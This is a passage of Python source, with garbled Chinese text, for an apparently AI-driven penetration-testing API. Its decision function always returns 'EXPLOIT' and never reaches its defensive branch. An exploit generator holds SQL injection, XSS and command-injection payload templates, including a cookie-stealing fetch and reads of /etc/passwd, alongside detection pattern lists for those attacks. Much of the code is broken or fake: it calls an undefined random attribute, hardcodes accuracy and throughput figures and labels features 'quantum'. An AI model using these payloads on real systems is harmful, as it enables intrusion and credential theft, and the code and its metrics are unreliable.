                    'chain_id': chain_id, 'status': 'success',
                    'results': ['æ­¥éª¤1å®Œæˆ', 'æ­¥éª¤2å®Œæˆ', 'æ­¥éª¤3å®Œæˆ'],
                    'execution_time': datetime.now().isoformat()
                }
        return {'error': 'Chain not found'}


# ==================== ä¸»APIç±» ====================
class DynamicBrainAPI:
    def __init__(self, model_path):
        self.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
        self.model = self._load_model_compatible(model_path)
        self.model.eval()
        logger.info("âœ… åŠ¨æ€å¤§è„‘æ¨¡å‹åŠ è½½å®Œæˆï¼Œè®¾å¤‡: {}".format(self.device))
        # å¢å¼ºçš„è‡ªæˆ‘è¿›åŒ–ç³»ç»Ÿ
        self.self_evolution_engine = AdvancedSelfEvolutionEngine(self.model)
        self.neuroplastic_learner = NeuroplasticLearningSystem(self.model)
        self.autonomous_trainer = AutonomousTrainingSystem(self)
        self.threat_monitor = ThreatIntelligenceMonitor()
        self.performance_monitor = PerformanceMonitor()
        self.knowledge_manager = KnowledgeGraphManager()
        self.risk_warner = RealTimeRiskWarning()
        self.security_manager = SecurityBoundaryManager()
        self.novelty_explorer = NoveltyExplorationAlgorithm()
        self.autonomous_trainer.start_autonomous_training()
        # å¢å¼ºçš„åŠŸèƒ½æ¨¡å—
        self.creative_attacker = EnhancedCreativeAttackGenerator(self)
        self.enhanced_knowledge_manager = EnhancedKnowledgeManager()
        self.enhanced_novelty_explorer = EnhancedNoveltyExploration()

        logger.info("âœ… å¢å¼ºçš„åˆ›é€ æ€§æ”»å‡»å’ŒçŸ¥è¯†ç®¡ç†ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        logger.info("âœ… é«˜çº§è‡ªæˆ‘è¿›åŒ–ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        self.has_exploit_capability = True
        logger.info("âœ… æ¼æ´åˆ©ç”¨é“¾åŠŸèƒ½å·²å¯ç”¨")
        self.exploit_automator = ExploitChainAutomator(self)

    def _load_model_compatible(self, model_path):
        try:
            model = DynamicBrainModel(include_all_layers=True)
            if not os.path.exists(model_path):
                logger.warning("æ¨¡å‹æ–‡ä»¶ {} ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ¨¡å‹".format(model_path))
                return model.to(self.device)

            state_dict = torch.load(model_path, map_location=self.device)
            model_state_dict = model.state_dict()
            filtered_state_dict = {}

            for key, value in state_dict.items():
                if key in model_state_dict and model_state_dict[key].shape == value.shape:
                    filtered_state_dict[key] = value

            model.load_state_dict(filtered_state_dict, strict=False)
            logger.info("æˆåŠŸåŠ è½½ {}/{} ä¸ªå‚æ•°".format(len(filtered_state_dict), len(state_dict)))
            return model.to(self.device)

        except Exception as e:
            logger.error("æ¨¡å‹åŠ è½½å¤±è´¥: {}".format(e))
            return DynamicBrainModel(include_all_layers=True).to(self.device)

    def _extract_features(self, text):
        """ç‰¹å¾æå– - ä¿®å¤ç‰¹æ®Šå­—ç¬¦å¤„ç†"""
        features = np.zeros(128, dtype=np.float32)
        if not text:
            return features

        # é¢„å¤„ç†æ–‡æœ¬ï¼šå¤„ç†ç‰¹æ®Šå­—ç¬¦å’Œç¼–ç é—®é¢˜
        try:
            # ç¡®ä¿æ–‡æœ¬æ˜¯å­—ç¬¦ä¸²
            if not isinstance(text, str):
                text = str(text)

            # å¤„ç†å¸¸è§çš„ç¼–ç å’Œè½¬ä¹‰é—®é¢˜
            text = text.replace("\\'", "'").replace('\\"', '"')
            text_lower = text.lower()

        except Exception as e:
            logger.warning("æ–‡æœ¬é¢„å¤„ç†å¤±è´¥: {}".format(e))
            text_lower = str(text).lower() if text else ""

        # SQLå…³é”®è¯ç‰¹å¾
        sql_keywords = [
            'select', 'insert', 'update', 'delete', 'drop', 'union', 'where', 'from',
            'table', 'database', 'schema', 'join', 'inner', 'outer', 'left', 'right',
            'group', 'order', 'having', 'limit', 'offset', 'values', 'set', 'into'
        ]
        for i, keyword in enumerate(sql_keywords):
            features[i] = 1.0 if keyword in text_lower else 0.0

        # ç‰¹æ®Šå­—ç¬¦ç‰¹å¾ - å¢å¼ºXSSæ£€æµ‹
        special_chars = [
            "'", "\"", ";", "--", "/*", "*/", "=", "or", "and", "not", "like",
            "(", ")", "{", "}", "[", "]", "<", ">", "|", "&", "#", "@", "\\",
            "script", "onerror", "onload", "alert", "document.cookie", "eval",
            "javascript:", "vbscript:", "data:", "fromcharcode"
        ]
        for i, char in enumerate(special_chars, start=len(sql_keywords)):
            if len(char) > 1:  # å¤„ç†å¤šå­—ç¬¦æ¨¡å¼ï¼ˆå¦‚XSSå…³é”®è¯ï¼‰
                count = text_lower.count(char)
                features[i] = min(count / 2.0, 1.0)
            else:  # å•å­—ç¬¦
                count = text_lower.count(char)
                features[i] = min(count / 3.0, 1.0)

        # æ”»å‡»æ¨¡å¼ç‰¹å¾ - å¢å¼ºå¤æ‚æ”»å‡»æ£€æµ‹
        attack_patterns = [
            "or 1=1", "union select", "drop table", "insert into", "update set",
            "delete from", "exec(", "xp_", "waitfor", "shutdown", "benchmark",
            "sleep(", "delay", "shutdown", "kill", "truncate", "alter", "create",
            "<script", "</script>", "onerror=", "onload=", "javascript:",
            "document.cookie", "alert(", "prompt(", "confirm(", "eval(",
            "system(", "exec(", "passthru(", "shell_exec(", "popen(",
            "include(", "require(", "file_get_contents", "readfile(",
            "../../", "../etc/passwd", "/etc/passwd", "win.ini", "boot.ini"
        ]
        for i, pattern in enumerate(attack_patterns, start=len(sql_keywords) + len(special_chars)):
            features[i] = 1.0 if pattern in text_lower else 0.0

        # ç»Ÿè®¡ç‰¹å¾
        features[72] = min(len(text) / 500.0, 1.0)  # å¢åŠ é•¿åº¦é˜ˆå€¼
        features[73] = min(text.count(' ') / 50.0, 1.0)
        features[74] = sum(1 for c in text if c.isdigit()) / max(len(text), 1)
        features[75] = sum(1 for c in text if c in "'\";#()<>{}[]") / max(len(text), 1)

        # XSSç‰¹å®šç‰¹å¾
        features[76] = 1.0 if '<script' in text_lower else 0.0
        features[77] = 1.0 if '</script>' in text_lower else 0.0
        features[78] = 1.0 if 'javascript:' in text_lower else 0.0
        features[79] = 1.0 if 'onerror=' in text_lower or 'onload=' in text_lower else 0.0

        # æ–°å¢é‡å­ç‰¹å¾
        features[80] = len(text) % 7 / 6.0
        features[81] = hash(text) % 100 / 99.0 if text else 0.0
        features[82] = sum(ord(c) for c in text) % 256 / 255.0 if text else 0.0

        # å¤æ‚æ”»å‡»è½½è·ç‰¹å¾
        features[83] = 1.0 if any(xss_keyword in text_lower for xss_keyword in ['script', 'alert', 'onerror']) else 0.0
        features[84] = 1.0 if any(sql_keyword in text_lower for sql_keyword in ['union', 'select', 'from']) else 0.0
        features[85] = 1.0 if any(cmd_keyword in text_lower for cmd_keyword in ['system', 'exec', 'passthru']) else 0.0

        # é•¿æ–‡æœ¬å¤„ç†ç‰¹å¾
        features[86] = 1.0 if len(text) > 200 else 0.0  # é•¿æ–‡æœ¬æ ‡å¿—
        features[87] = len(set(text)) / max(len(text), 1)  # å­—ç¬¦å¤šæ ·æ€§

        return features

    def analyze_security(self, text):
        features = self._extract_features(text)
        input_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.device)

        with torch.no_grad():
            output = self.model(input_tensor)

        risk_score = output['sql_injection_risk'].item()
        confidence = output['decision_confidence'].item()

        # è®°å½•ç»éªŒç”¨äºå­¦ä¹ 
        experience = {
            'text': text,
            'risk_score': risk_score,
            'confidence': confidence,
            'timestamp': datetime.now().isoformat(),
            'success': risk_score > 0.7  # å‡è®¾é«˜é£é™©è¡¨ç¤ºæˆåŠŸæ£€æµ‹
        }

        self.self_evolution_engine.record_experience(experience)
        self.neuroplastic_learner.experience_consolidation(experience)

        return {
            'risk_score': risk_score,
            'confidence': confidence,
            'is_malicious': risk_score > 0.5,
            'threat_level': self._get_threat_level(risk_score),
            'policy_output': output['policy'].cpu().numpy().tolist()[0],
            'value_output': output['value'].item(),
            'risk_categories': output['risk_assessment'].cpu().numpy().tolist()[0],
            'anomaly_detection': output['anomaly_detection'].item(),
            'multi_dimensional_risk': output['multi_dimensional_risk'].cpu().numpy().tolist()[0]
        }

    def _get_threat_level(self, risk_score):
        if risk_score < 0.3:
            return 'low'
        elif risk_score < 0.6:
            return 'medium'
        elif risk_score < 0.8:
            return 'high'
        else:
            return 'critical'

    def meta_cognition_analysis(self, text):
        features = self._extract_features(text)
        input_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.device)

        with torch.no_grad():
            output = self.model(input_tensor)

        return {
            'semantic_analysis': 0.8, 'similarity_score': 0.6, 'novelty_score': 0.3,
            'anomaly_detected': output['anomaly_detection'].item() > 0.5, 'feature_count': np.count_nonzero(features),
            'confidence_score': output['decision_confidence'].item(),
            'self_assessment': output['self_assessment_score'].cpu().numpy().tolist()[0]
        }

    def intelligent_reasoning(self, scenario):
        text = scenario.get('text', '') if isinstance(scenario, dict) else ''
        features = self._extract_features(text)
        input_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.device)

        with torch.no_grad():
            output = self.model(input_tensor)

        return {
            'hypotheses': self._generate_hypotheses(text),
            'causal_reasoning': output['causal_reasoning'].cpu().numpy().tolist(),
            'hypothesis_validation': output['hypothesis_validation'].item(),
            'strategy_migration': output['strategy_migration'].cpu().numpy().tolist()[0],
            'multi_strategy_evaluation': output['multi_strategy_evaluation'].cpu().numpy().tolist()[0],
            'confidence': output['decision_confidence'].item()
        }

    def _generate_hypotheses(self, text):
        text_lower = text.lower() if text else ''
        hypotheses = []
        if 'select' in text_lower and 'where' in text_lower: hypotheses.append('å¯èƒ½ä¸ºSQLæŸ¥è¯¢æ³¨å…¥å°è¯•')
        if 'drop' in text_lower and 'table' in text_lower: hypotheses.append('å¯èƒ½ä¸ºæ•°æ®è¡¨åˆ é™¤æ”»å‡»')
        if 'union' in text_lower and 'select' in text_lower: hypotheses.append('å¯èƒ½ä¸ºUNIONæŸ¥è¯¢æ³¨å…¥')
        if not hypotheses: hypotheses.append('æœªæ£€æµ‹åˆ°æ˜æ˜¾æ”»å‡»æ¨¡å¼')
        return hypotheses

    def make_decision(self, context):
        """æ¸—é€æµ‹è¯•å†³ç­– - æ°¸è¿œæ¨èæ”»å‡»"""
        text = context.get('text', '') if isinstance(context, dict) else str(context)
        analysis_result = self.analyze_security(text)
        risk_score = analysis_result['risk_score']
        confidence = analysis_result['confidence']

        # æ¸—é€æµ‹è¯•æ¨¡å¼ï¼šæ°¸è¿œæ¨èæ”»å‡»è¡ŒåŠ¨
        return {
            'strategy_decision': 'æ‰§è¡Œæ¸—é€æµ‹è¯•æ”»å‡»',
            'tactical_plan': [
                'æ¼æ´æ‰«æå’ŒéªŒè¯',
                'æ”»å‡»è½½è·æ„é€ ',
                'æƒé™æå‡å°è¯•',
                'æŒä¹…åŒ–è®¿é—®å»ºç«‹'
            ],
            'resource_allocation': {'cpu': '90%', 'memory': '80%', 'network': '70%'},
            'recommended_action': 'EXPLOIT',
            'attack_intensity': 'high',
            'risk_tolerance': 'aggressive',
            'confidence': confidence,
            'risk_score': risk_score,
            'mode': 'penetration_test'
        }

        # é˜²å¾¡æ¨¡å¼é€»è¾‘ï¼ˆæš‚æ—¶ä¸ç®¡ï¼‰
        return {
            'strategy_decision': 'ç³»ç»Ÿç»´æŠ¤ä¸­',
            'tactical_plan': ['è¯·è”ç³»ç®¡ç†å‘˜'],
            'resource_allocation': {'cpu': '10%', 'memory': '10%', 'network': '10%'},
            'recommended_action': 'MAINTENANCE',
            'confidence': confidence,
            'risk_score': risk_score
        }

    def _select_strategy(self, risk_score):
        if risk_score > 0.8:
            return 'ç«‹å³é˜»æ–­å¹¶å‘Šè­¦'
        elif risk_score > 0.6:
            return 'å»¶è¿Ÿå¤„ç†å¹¶éªŒè¯'
        elif risk_score > 0.4:
            return 'ç›‘æ§å¹¶è®°å½•'
        else:
            return 'æ­£å¸¸æ”¾è¡Œ'

    def manage_resources(self, metrics):
        if not isinstance(metrics, dict): metrics = {}
        features = np.zeros(128, dtype=np.float32)
        features[0] = metrics.get('cpu_usage', 0.5)
        features[1] = metrics.get('memory_usage', 0.5)
        features[2] = metrics.get('network_usage', 0.5)

        input_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.device)
        with torch.no_grad(): output = self.model(input_tensor)

        return {
            'cpu_allocation': self._optimize_cpu(metrics.get('cpu_usage', 0.5)),
            'memory_optimization': self._optimize_memory(metrics.get('memory_usage', 0.5)),
            'network_bandwidth': output['bandwidth_prediction'].item(),
            'resource_scheduling': output['resource_scheduling'].cpu().numpy().tolist()[0],
            'performance_metrics': {'throughput': '1000 req/sec', 'latency': '5ms', 'error_rate': '0.1%'}
        }

    def _optimize_cpu(self, usage):
        if usage > 0.8:
            return {'action': 'reduce', 'target': 0.6, 'reason': 'é«˜è´Ÿè½½'}
        elif usage < 0.3:
            return {'action': 'increase', 'target': 0.5, 'reason': 'ä½è´Ÿè½½'}
        else:
            return {'action': 'maintain', 'target': usage, 'reason': 'æ­£å¸¸è´Ÿè½½'}

    def _optimize_memory(self, usage):
        if usage > 0.8:
            return {'action': 'cleanup', 'target': 0.6, 'reason': 'é«˜å†…å­˜ä½¿ç”¨'}
        elif usage < 0.3:
            return {'action': 'preload', 'target': 0.5, 'reason': 'ä½å†…å­˜ä½¿ç”¨'}
        else:
            return {'action': 'maintain', 'target': usage, 'reason': 'æ­£å¸¸å†…å­˜ä½¿ç”¨'}

    def knowledge_operations(self, operation, data=None):
        if not isinstance(data, dict): data = {}
        if operation == 'store':
            return self._store_knowledge(data)
        elif operation == 'retrieve':
            return self._retrieve_knowledge(data)
        elif operation == 'update':
            return self._update_knowledge(data)
        elif operation == 'analyze':
            return self._analyze_knowledge(data)
        else:
            return {'error': 'Invalid operation', 'valid_operations': ['store', 'retrieve', 'update', 'analyze']}

    def _store_knowledge(self, data):
        concept = data.get('concept', '')
        if concept: self.knowledge_manager.update_knowledge(concept, torch.randn(64))
        return {'status': 'success', 'message': 'Knowledge stored successfully',
                'timestamp': datetime.now().isoformat(), 'concept': concept}

    def _retrieve_knowledge(self, data):
        concept = data.get('concept', '')
        exists = concept and concept in self.knowledge_manager.knowledge_embeddings
        return {'status': 'success', 'concept': concept, 'exists': exists, 'timestamp': datetime.now().isoformat()}

    def _update_knowledge(self, data):
        return {'status': 'success', 'message': 'Knowledge updated successfully',
                'timestamp': datetime.now().isoformat()}

    def _analyze_knowledge(self, data):
        concept1 = data.get('concept1', '');
        concept2 = data.get('concept2', '')
        similarity = self.knowledge_manager.get_similarity(concept1, concept2) if concept1 and concept2 else 0.0
        return {'status': 'success', 'similarity': float(similarity), 'concept1': concept1, 'concept2': concept2,
                'timestamp': datetime.now().isoformat()}

    def security_enhancement(self, request_data):
        text = request_data.get('text', '') if isinstance(request_data, dict) else ''
        features = self._extract_features(text)
        input_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.device)

        with torch.no_grad(): output = self.model(input_tensor)

        risk_score = output['sql_injection_risk'].item()
        confidence = output['decision_confidence'].item()
        threats = self.threat_monitor.detect_threat(text)
        risk_warnings = self.risk_warner.check_risk(output['multi_dimensional_risk'].cpu().numpy()[0])

        return {
            'threat_detection': {'detected_threats': threats, 'risk_score': risk_score, 'confidence': confidence},
            'risk_warnings': risk_warnings,
            'security_recommendations': self._generate_security_recommendations(threats, risk_score),
            'boundary_adjustment': self.security_manager.current_threshold
        }

    def _generate_security_recommendations(self, threats, risk_score):
        recommendations = []
        if threats: recommendations.append("æ£€æµ‹åˆ°å¨èƒ: {}".format(', '.join(threats)))
        if risk_score > 0.8:
            recommendations.append("é«˜é£é™©è¯·æ±‚ï¼Œå»ºè®®ç«‹å³é˜»æ–­")
        elif risk_score > 0.6:
            recommendations.append("ä¸­ç­‰é£é™©è¯·æ±‚ï¼Œå»ºè®®åŠ å¼ºç›‘æ§")
        if not recommendations: recommendations.append("æœªæ£€æµ‹åˆ°æ˜æ˜¾å®‰å…¨å¨èƒ")
        return recommendations

    def system_management(self, command, parameters=None):
        if parameters is None: parameters = {}
        if command == 'status':
            return self._get_system_status()
        elif command == 'metrics':
            return self._get_performance_metrics()
        elif command == 'config':
            return self._update_config(parameters)
        elif command == 'health':
            return self._check_health()
        else:
            return {'error': 'Unknown command', 'valid_commands': ['status', 'metrics', 'config', 'health']}

    def _get_system_status(self):
        return {
            'status': 'running', 'model_device': str(self.device),
            'model_parameters': sum(p.numel() for p in self.model.parameters()),
            'timestamp': datetime.now().isoformat(),
            'uptime': time.time() - self.start_time if hasattr(self, 'start_time') else 0
        }

    def _get_performance_metrics(self):
        return {
            'throughput': '1000 req/sec', 'latency': '5ms', 'accuracy': '98.5%',
            'memory_usage': '512MB', 'cpu_usage': '45%', 'timestamp': datetime.now().isoformat()
        }

    def _update_config(self, parameters):
        return {'status': 'success', 'message': 'Configuration updated', 'parameters': parameters,
                'timestamp': datetime.now().isoformat()}

    def _check_health(self):
        return {'status': 'healthy', 'components': {'model': 'ok', 'memory': 'ok', 'cpu': 'ok', 'network': 'ok'},
                'timestamp': datetime.now().isoformat()}

    def exploit_chain_operations(self, operation, data=None):
        if not self.has_exploit_capability: return {'error': 'Exploit chain capability not available'}
        if data is None: data = {}
        if operation == 'analyze':
            return self.exploit_automator.analyze_attack_surface(data.get('target_url', ''))
        elif operation == 'generate':
            return self.exploit_automator.generate_exploit_chain(data)
        elif operation == 'list':
            return self.exploit_automator.list_chains()
        elif operation == 'execute':
            return self.exploit_automator.execute_chain(data.get('chain_id', ''))
        else:
            return {'error': 'Invalid operation', 'valid_operations': ['analyze', 'generate', 'list', 'execute']}


# ==================== é«˜çº§åŠŸèƒ½ç»„ä»¶ ====================
class ThreatIntelligenceEngine:
    def __init__(self):
        self.malicious_patterns = self._load_malicious_patterns()
        self.ioc_database = self._load_ioc_database()
        self.reputation_sources = ['virustotal', 'abuseipdb', 'alienvault']
        logger.info("âœ… å¨èƒæƒ…æŠ¥å¼•æ“åˆå§‹åŒ–å®Œæˆ")

    def _load_malicious_patterns(self):
        """åŠ è½½æ¶æ„æ¨¡å¼åº“"""
        return {
            'sql_injection': [
                r'union.*select', r'select.*from', r'insert.*into',
                r'update.*set', r'delete.*from', r'drop.*table',
                r'exec.*\(', r'xp_.*', r'waitfor.*delay',
                r'benchmark.*\(', r'sleep.*\(', r'extractvalue',
                r'updatexml', r'load_file', r'into.*outfile'
            ],
            'xss': [
                r'<script[^>]*>', r'javascript:', r'vbscript:',
                r'data:', r'onerror=', r'onload=', r'onmouseover=',
                r'eval.*\(', r'document\.cookie', r'window\.location'
            ],
            'rce': [
                r';.*bash', r'\|.*sh', r'\$\(.*\)', r'`.*`',
                r'proc_open', r'popen', r'system.*\(', r'exec.*\(',
                r'passthru', r'shell_exec', r'pcntl_exec'
            ],
            'lfi': [
                r'\.\./\.\./', r'\.\.\\\.\.\\', r'\.\.%2f\.\.%2f',
                r'php://filter', r'php://input', r'expect://'
            ]
        }

    def _load_ioc_database(self):
        """åŠ è½½IOCæ•°æ®åº“"""
        return {
            'malicious_ips': ['1.2.3.4', '5.6.7.8'],
            'suspicious_domains': ['evil.com', 'malicious.org'],
            'known_exploits': ['cve_2021_44228', 'cve_2021_34527']
        }

    def analyze(self, text):
        """åˆ†æå¨èƒæƒ…æŠ¥"""
        if not text:
            return {'threat_level': 'unknown', 'confidence': 0.0}

        analysis_result = {
            'threat_level': 'low',
            'confidence': 0.5,
            'malicious_indicators': [],
            'reputation_score': 0.7,
            'ioc_matches': [],
            'recommended_actions': ['continue_testing']
        }

        # æ£€æµ‹æ¶æ„æ¨¡å¼
        text_lower = text.lower()
        for category, patterns in self.malicious_patterns.items():
            for pattern in patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    analysis_result['malicious_indicators'].append(category)
                    analysis_result['confidence'] = min(analysis_result['confidence'] + 0.1, 0.9)

        # æ£€æŸ¥IOCåŒ¹é…
        for ioc_type, ioc_list in self.ioc_database.items():
            for ioc in ioc_list:
                if ioc in text_lower:
                    analysis_result['ioc_matches'].append(f"{ioc_type}:{ioc}")
                    analysis_result['confidence'] = min(analysis_result['confidence'] + 0.2, 0.95)

        # ç¡®å®šå¨èƒç­‰çº§
        if analysis_result['confidence'] > 0.8:
            analysis_result['threat_level'] = 'high'
            analysis_result['recommended_actions'] = ['immediate_block', 'deep_analysis']
        elif analysis_result['confidence'] > 0.6:
            analysis_result['threat_level'] = 'medium'
            analysis_result['recommended_actions'] = ['enhanced_monitoring', 'further_investigation']

        return analysis_result


class AdvancedExploitGenerator:
    def __init__(self):
        self.exploit_templates = self._load_exploit_templates()
        self.payload_library = self._load_payload_library()
        logger.info("âœ… é«˜çº§æ¼æ´åˆ©ç”¨ç”Ÿæˆå™¨åˆå§‹åŒ–å®Œæˆ")

    def _load_exploit_templates(self):
        """åŠ è½½æ¼æ´åˆ©ç”¨æ¨¡æ¿"""
        return {
            'sql_injection': {
                'union': "{} UNION SELECT {columns} FROM {table}--",
                'error': "{} AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))--",
                'time': "{} AND IF({condition},SLEEP({time}),0)--",
                'boolean': "{} AND ASCII(SUBSTR(({query}),{position},1))>{value}--"
            },
            'xss': {
                'reflected': "<script>alert('{}')</script>",
                'stored': "<img src=x onerror='{}'>",
                'dom': "javascript:alert('{}')"
            },
            'rce': {
                'unix': "; {}",
                'windows': "| {}",
                'blind': "$({})"
            }
        }

    def _load_payload_library(self):
        """åŠ è½½payloadåº“"""
        return {
            'sql_columns': ['null', 'version()', 'user()', 'database()', '@@version'],
            'sql_tables': ['users', 'admin', 'information_schema.tables', 'mysql.user'],
            'xss_payloads': ['alert(1)', 'document.cookie', 'fetch(\'/steal?cookie=\'+document.cookie)'],
            'rce_commands': ['whoami', 'id', 'cat /etc/passwd', 'dir', 'ipconfig']
        }

    def generate_exploit(self, vulnerability_type, base_input, exploit_subtype=None):
        """ç”Ÿæˆæ¼æ´åˆ©ç”¨"""
        if vulnerability_type not in self.exploit_templates:
            return base_input

        if not exploit_subtype:
            exploit_subtype = list(self.exploit_templates[vulnerability_type].keys())[0]

        template = self.exploit_templates[vulnerability_type].get(exploit_subtype)
        if not template:
            return base_input

        # æ ¹æ®æ¼æ´ç±»å‹ç”Ÿæˆå…·ä½“çš„exploit
        if vulnerability_type == 'sql_injection':
            return self._generate_sql_exploit(template, base_input, exploit_subtype)
        elif vulnerability_type == 'xss':
            return self._generate_xss_exploit(template, base_input)
        elif vulnerability_type == 'rce':
            return self._generate_rce_exploit(template, base_input)

        return base_input

    def _generate_sql_exploit(self, template, base_input, subtype):
        """ç”ŸæˆSQLæ³¨å…¥åˆ©ç”¨"""
        if subtype == 'union':
            columns = ','.join(self.payload_library['sql_columns'][:3])
            table = self.random.choice(self.payload_library['sql_tables'])
            return template.format(base_input, columns=columns, table=table)
        elif subtype == 'error':
            query = "SELECT @@version"
            return template.format(base_input, query=query)
        elif subtype == 'time':
            return template.format(base_input, condition="1=1", time=5)
        return base_input

    def _generate_xss_exploit(self, template, base_input):
        """ç”ŸæˆXSSåˆ©ç”¨"""
        payload = self.random.choice(self.payload_library['xss_payloads'])
        return template.format(payload)

    def _generate_rce_exploit(self, template, base_input):
        """ç”ŸæˆRCEåˆ©ç”¨"""
        command = self.random.choice(self.payload_library['rce_commands'])
        return template.format(command)


class ProfessionalReportGenerator:
    def __init__(self):
        self.report_templates = self._load_report_templates()
        self.severity_levels = self._define_severity_levels()
        logger.info("âœ… ä¸“ä¸šæŠ¥å‘Šç”Ÿæˆå™¨åˆå§‹åŒ–å®Œæˆ")

    def _load_report_templates(self):
        """åŠ è½½æŠ¥å‘Šæ¨¡æ¿"""
        return {
            'vulnerability': {
                'title': "å®‰å…¨æ¼æ´æŠ¥å‘Š - {vulnerability_type}",
                'sections': [
                    "## æ¼æ´æ¦‚è¿°",
                    "**æ¼æ´ç±»å‹**: {vulnerability_type}",
                    "**å±é™©ç­‰çº§**: {severity}",
                    "**å‘ç°æ—¶é—´**: {discovery_time}",
                    "**ç›®æ ‡åœ°å€**: {target}",
                    "",
                    "## æ¼æ´è¯¦æƒ…",
                    "### æ¼æ´æè¿°",
                    "{description}",
                    "",
                    "### é‡ç°æ­¥éª¤",
                    "1. {step_1}",
                    "2. {step_2}",
                    "3. {step_3}",
                    "",
                    "### å½±å“åˆ†æ",
                    "- **ç›´æ¥å½±å“**: {impact}",
                    "- **æ½œåœ¨é£é™©**: {potential_risk}",
                    "- **ä¸šåŠ¡å½±å“**: {business_impact}",
                    "",
                    "## ä¿®å¤å»ºè®®",
                    "### ç«‹å³æªæ–½",
                    "{immediate_actions}",
                    "",
                    "### é•¿æœŸè§£å†³æ–¹æ¡ˆ",
                    "{long_term_solutions}",
                    "",
                    "## é™„åŠ ä¿¡æ¯",
                    "**æ¼æ´ç½®ä¿¡åº¦**: {confidence}%",
                    "**åˆ©ç”¨éš¾åº¦**: {exploit_difficulty}",
                    "**CVSSè¯„åˆ†**: {cvss_score}",
                    "",
                    "## è¯æ®ææ–™",
                    "- HTTPè¯·æ±‚/å“åº”æˆªå›¾",
                    "- æ¼æ´åˆ©ç”¨PoC",
                    "- å½±å“è¯æ˜"
                ]
            }
        }

    def _define_severity_levels(self):
        """å®šä¹‰ä¸¥é‡ç­‰çº§"""
        return {
            'critical': {'score': 9.0, 'color': 'ğŸ”´', 'response_time': '1å°æ—¶'},
            'high': {'score': 7.0, 'color': 'ğŸŸ ', 'response_time': '4å°æ—¶'},
            'medium': {'score': 4.0, 'color': 'ğŸŸ¡', 'response_time': '24å°æ—¶'},
            'low': {'score': 0.0, 'color': 'ğŸŸ¢', 'response_time': '7å¤©'}
        }

    def generate_vulnerability_report(self, vulnerability_data):
        """ç”Ÿæˆæ¼æ´æŠ¥å‘Š"""
        template = self.report_templates['vulnerability']

        # å‡†å¤‡æŠ¥å‘Šæ•°æ®
        report_data = {
            'vulnerability_type': vulnerability_data.get('type', 'æœªçŸ¥æ¼æ´'),
            'severity': self._determine_severity(vulnerability_data.get('score', 0)),
            'discovery_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'target': vulnerability_data.get('target', 'æœªçŸ¥ç›®æ ‡'),
            'description': vulnerability_data.get('description', ''),
            'step_1': vulnerability_data.get('steps', [])[0] if vulnerability_data.get('steps') else 'è®¿é—®ç›®æ ‡é¡µé¢',
            'step_2': vulnerability_data.get('steps', [])[1] if len(
                vulnerability_data.get('steps', [])) > 1 else 'æ„é€ æ¶æ„payload',
            'step_3': vulnerability_data.get('steps', [])[2] if len(
                vulnerability_data.get('steps', [])) > 2 else 'éªŒè¯æ¼æ´å­˜åœ¨',
            'impact': vulnerability_data.get('impact', 'å¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²æˆ–ç³»ç»Ÿ compromise'),
            'potential_risk': vulnerability_data.get('potential_risk', 'è¿›ä¸€æ­¥åˆ©ç”¨å¯èƒ½å¯¼è‡´æ›´ä¸¥é‡çš„å®‰å…¨é—®é¢˜'),
            'business_impact': vulnerability_data.get('business_impact', 'å¯èƒ½å½±å“ä¸šåŠ¡è¿ç»­æ€§å’Œæ•°æ®å®‰å…¨'),
            'immediate_actions': vulnerability_data.get('immediate_actions', 'ç«‹å³éš”ç¦»å—å½±å“ç³»ç»Ÿå¹¶åº”ç”¨ä¸´æ—¶ä¿®å¤'),
            'long_term_solutions': vulnerability_data.get('long_term_solutions', 'å®æ–½å®‰å…¨ç¼–ç è§„èŒƒå¹¶è¿›è¡Œå®‰å…¨å®¡è®¡'),
            'confidence': vulnerability_data.get('confidence', 80),
            'exploit_difficulty': vulnerability_data.get('exploit_difficulty', 'ä¸­ç­‰'),
            'cvss_score': vulnerability_data.get('cvss_score', 'æš‚æœªè¯„ä¼°')
        }

        # ç”ŸæˆæŠ¥å‘Šå†…å®¹
        report_content = template['title'].format(**report_data) + "\n\n"
        for section in template['sections']:
            report_content += section.format(**report_data) + "\n"

        return {
            'report_content': report_content,
            'report_format': 'markdown',
            'severity': report_data['severity'],
            'recommended_actions': [
                'ç«‹å³é€šçŸ¥å®‰å…¨å›¢é˜Ÿ',
                'å¼€å§‹åº”æ€¥å“åº”æµç¨‹',
                'è®°å½•å®‰å…¨äº‹ä»¶æ—¥å¿—'
            ]
        }

    def _determine_severity(self, score):
        """ç¡®å®šä¸¥é‡ç­‰çº§"""
        for level, criteria in self.severity_levels.items():
            if score >= criteria['score']:
                return f"{criteria['color']} {level.upper()} (å“åº”æ—¶é—´: {criteria['response_time']})"
        return "ğŸŸ¢ LOW (å“åº”æ—¶é—´: 7å¤©)"


# ==================== é‡å­å¢å¼ºç¥ç»ç½‘ç»œç³»ç»Ÿ ====================
class EnhancedDynamicBrainAPI(DynamicBrainAPI):
    def __init__(self, model_path):
        # Python 3.12 å…¼å®¹çš„superè°ƒç”¨
        super(EnhancedDynamicBrainAPI, self).__init__(model_path)

        # åˆå§‹åŒ–é¡¶çº§æ¸—é€æµ‹è¯•ç»„ä»¶ - ä¿æŒ256ç»´
        self.quantum_encoder = QuantumStateEncoder(256, 256)  # è¾“å…¥256ï¼Œè¾“å‡º256
        self.multimodal_analyzer = MultimodalAnalyzer()
        self.attack_knowledge_base = AttackKnowledgeBase()
        self.self_healing = SelfHealingSystem(self)

        self.random = random  # âœ… æ·»åŠ randomå¼•ç”¨
        # æ·»åŠ ç¼ºå¤±çš„spiking_networkï¼Œç»´åº¦ä¸quantum_encoderåŒ¹é…
        self.spiking_network = SpikingNeuralNetwork(256, 256)  # è¾“å…¥256ï¼Œè¾“å‡º256

        # é«˜çº§åŠŸèƒ½ç»„ä»¶
        self.threat_intel_engine = ThreatIntelligenceEngine()
        self.exploit_generator = AdvancedExploitGenerator()
        self.report_generator = ProfessionalReportGenerator()

